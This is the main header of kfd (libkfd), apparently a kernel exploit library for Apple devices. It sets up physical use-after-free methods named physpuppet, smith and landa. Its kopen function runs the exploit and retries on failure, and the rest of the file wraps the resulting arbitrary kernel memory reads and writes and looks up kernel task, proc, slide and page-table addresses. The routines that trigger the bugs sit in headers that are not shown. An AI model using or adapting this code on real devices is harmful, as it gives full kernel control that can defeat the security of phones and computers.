/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef libkfd_h
#define libkfd_h
#include <stdint.h>
static uint64_t _kfd = 0;
/*
 * The global configuration parameters of libkfd.
 */
#define CONFIG_ASSERT 1
#define CONFIG_PRINT 1
#define CONFIG_TIMER 1

#include "libkfd/common.h"

/*
 * The public API of libkfd.
 */

enum puaf_method {
    puaf_physpuppet,
    puaf_smith,
    puaf_landa,
};

enum kread_method {
    kread_kqueue_workloop_ctl,
    kread_sem_open,
};

enum kwrite_method {
    kwrite_dup,
    kwrite_sem_open,
};

static inline u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
static inline void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
static inline void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);
static inline void kclose(u64 kfd);

/*
 * The private API of libkfd.
 */

struct kfd; // Forward declaration for function pointers.

struct info {
    struct {
        vm_address_t src_uaddr;
        vm_address_t dst_uaddr;
        vm_size_t size;
    } copy;
    struct {
        i32 pid;
        u64 tid;
        u64 vid;
        u64 maxfilesperproc;
    } env;
    struct {
        u64 current_map;
        u64 current_pmap;
        u64 current_proc;
        u64 current_task;
        u64 kernel_map;
        u64 kernel_pmap;
        u64 kernel_proc;
        u64 kernel_task;
    } kaddr;
};

struct perf {
    u64 kernel_slide;
    u64 gVirtBase;
    u64 gPhysBase;
    u64 gPhysSize;
    struct {
        u64 pa;
        u64 va;
    } ttbr[2];
    struct ptov_table_entry {
        u64 pa;
        u64 va;
        u64 len;
    } ptov_table[8];
    struct {
        u64 kaddr;
        u64 paddr;
        u64 uaddr;
        u64 size;
    } shared_page;
    struct {
        i32 fd;
        u32 si_rdev_buffer[2];
        u64 si_rdev_kaddr;
    } dev;
    void (*saved_kread)(struct kfd*, u64, void*, u64);
    void (*saved_kwrite)(struct kfd*, void*, u64, u64);
};

struct puaf {
    u64 number_of_puaf_pages;
    u64* puaf_pages_uaddr;
    void* puaf_method_data;
    u64 puaf_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*run)(struct kfd*);
        void (*cleanup)(struct kfd*);
        void (*free)(struct kfd*);
    } puaf_method_ops;
};

struct krkw {
    u64 krkw_maximum_id;
    u64 krkw_allocated_id;
    u64 krkw_searched_id;
    u64 krkw_object_id;
    u64 krkw_object_uaddr;
    u64 krkw_object_size;
    void* krkw_method_data;
    u64 krkw_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*allocate)(struct kfd*, u64);
        bool (*search)(struct kfd*, u64);
        void (*kread)(struct kfd*, u64, void*, u64);
        void (*kwrite)(struct kfd*, void*, u64, u64);
        void (*find_proc)(struct kfd*);
        void (*deallocate)(struct kfd*, u64);
        void (*free)(struct kfd*);
    } krkw_method_ops;
};

struct kfd {
    struct info info;
    struct perf perf;
    struct puaf puaf;
    struct krkw kread;
    struct krkw kwrite;
};

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"

static inline struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}

static inline void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

static inline u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    int fail = -1;
    
    timer_start();

    const u64 puaf_pages_min = 16;
    const u64 puaf_pages_max = 2048;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_landa);
    assert(kread_method <= kread_sem_open);
    assert(kwrite_method <= kwrite_sem_open);

    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
    
retry:
    puaf_run(kfd);
    
    fail = krkw_run(kfd);
    if(fail && (puaf_method == puaf_landa)) {
        // Thanks: m1zole / dunkeyyfong
        puaf_free(kfd);
        info_free(kfd);
        bzero(kfd, sizeof(struct kfd));
        info_init(kfd);
        puaf_init(kfd, puaf_pages, puaf_method);
        krkw_init(kfd, kread_method, kwrite_method);
        perf_init(kfd);
        goto retry;
    }
    
    info_run(kfd);
    perf_run(kfd);
    puaf_cleanup(kfd);
    _kfd = (uint64_t)kfd;
    timer_end();
    return (u64)(kfd);
}

static inline void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
{
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

static inline void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
{
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}
static inline void kread_kfd(uint64_t kfd, uint64_t va, void* ua, uint64_t size) {
    krkw_kread((struct kfd*)(kfd), va, ua, size);
}

static inline void kwrite_kfd(uint64_t kfd, const void* ua, uint64_t va, uint64_t size) {
    krkw_kwrite((struct kfd*)(kfd), (void*)ua, va, size);
}

static inline void kclose(uint64_t kfd) {
    kfd_free((struct kfd*)(kfd));
}

static inline void kreadbuf_kfd(uint64_t va, void* ua, size_t size) {
    kread_kfd(_kfd, va, ua, size);
}

static inline void kwritebuf_kfd(uint64_t va, const void* ua, size_t size) {
    kwrite_kfd(_kfd, ua, va, size);
}

static inline uint64_t kread64_kfd(uint64_t va) {
    uint64_t u;
    kread_kfd(_kfd, va, &u, 8);
    return u;
}

static inline uint64_t kread64_ptr_kfd(uint64_t kaddr) {
    uint64_t ptr = kread64_kfd(kaddr);
    if ((ptr >> 55) & 1) {
        return ptr | 0xffffff8000000000;
    }

    return ptr;
}


static inline uint32_t kread32_kfd(uint64_t va) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u32[0];
}

static inline uint16_t kread16_kfd(uint64_t va) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u16[0];
}

static inline uint8_t kread8_kfd(uint64_t va) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u8[0];
}

static inline void kwrite64_kfd(uint64_t va, uint64_t val) {
    uint64_t u[1] = {};
    u[0] = val;
    kwrite_kfd((uint64_t)(_kfd), &u, va, 8);
}

static inline void kwrite32_kfd(uint64_t va, uint32_t val) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u32[0] = val;
    kwrite64_kfd(va, u.u64);
}

static inline void kwrite16_kfd(uint64_t va, uint16_t val) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u16[0] = val;
    kwrite64_kfd(va, u.u64);
}

static inline void kwrite8_kfd(uint64_t va, uint8_t val) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u8[0] = val;
    kwrite64_kfd(va, u.u64);
}

static inline uint64_t get_kernel_proc(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->info.kaddr.kernel_proc;
}

static inline uint64_t get_kernel_task(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->info.kaddr.kernel_task;
}

static inline uint64_t get_current_proc(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->info.kaddr.current_proc;
}

static inline uint64_t get_current_task(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->info.kaddr.current_task;
}

static inline uint64_t get_current_map(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->info.kaddr.current_map;
}

static inline uint64_t get_kernel_pmap(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->info.kaddr.kernel_pmap;
}

static inline uint64_t get_current_pmap(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->info.kaddr.current_pmap;
}

static inline uint64_t get_kernel_map(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->info.kaddr.kernel_map;
}

static inline uint64_t get_kernel_ttbr0va(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->perf.ttbr[0].va;
}

static inline uint64_t get_kernel_ttbr1va(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->perf.ttbr[1].va;
}

static inline uint64_t get_kw_object_uaddr(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->kwrite.krkw_object_uaddr;
}

static inline uint64_t get_kernel_slide(void) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return kfd->perf.kernel_slide;
}

static inline uint64_t phystokv_kfd(uint64_t pa) {
    struct kfd* kfd = ((struct kfd*)_kfd);
    return phystokv(kfd, pa);
}

static inline uint64_t vtophys_kfd(uint64_t va) {
    struct kfd *kfd = (struct kfd*)_kfd;
    return vtophys(kfd, va);
}
/*
uint64_t get_proc(pid_t target) {
    struct kfd *kfd = (struct kfd*)_kfd;
    uint64_t proc_kaddr = get_kernel_proc();
    while (true) {
        int32_t pid = dynamic_kget(proc, p_pid, proc_kaddr);
        if (pid == target) {
            break;
        }
        proc_kaddr = dynamic_kget(proc, p_list_le_prev, proc_kaddr);
    }
    return proc_kaddr;
}
*/
#endif /* libkfd_h */
